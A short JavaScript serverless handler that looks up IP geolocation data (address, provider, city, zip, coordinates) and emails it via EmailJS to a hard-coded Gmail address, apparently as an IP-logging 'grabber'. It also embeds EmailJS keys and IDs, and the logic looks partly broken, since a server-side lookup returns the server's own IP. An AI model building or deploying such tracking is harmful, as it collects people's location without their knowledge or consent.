import emailjs from 'emailjs-com';

export default async function handler(req, res) {
    // Fetch IP data from the ip-api
    const ipRes = await fetch('https://ip-api.com/json/');
    const ipData = await ipRes.json();

    // EmailJS configuration
    const serviceID = 'service_x25rs8q';  // Replace with your EmailJS service ID
    const templateID = 'template_3mgw9je'; // Replace with your EmailJS template ID
    const publicKey = '4ItP8f4Z88r0-9S1M'; // Replace with your EmailJS public key

    // Map the IP data to the template fields
    const emailParams = {
        to_email: 'boriszarkov4@gmail.com',  // Replace with your email
        ip_address: ipData.query,  // The IP Address
        provider: ipData.org + " (" + ipData.as + ")",  // Provider and ASN
        timezone: ipData.timezone,  // Timezone
        country: ipData.country,  // Country
        city: ipData.city,  // City
        zip: ipData.zip,  // Zip Code
        latitude: ipData.lat,  // Latitude
        longitude: ipData.lon  // Longitude
    };

    // Send the data to your email using EmailJS
    try {
        const response = await emailjs.send(serviceID, templateID, emailParams, publicKey); // Use the public key for frontend requests
        console.log('Email sent successfully:', response);

        // Respond with success
        res.status(200).json({ message: 'IP info sent to your email.' });
    } catch (error) {
        console.error('Error sending email:', error);

        // Respond with failure
        res.status(500).json({ error: 'Failed to send email.' });
    }
}
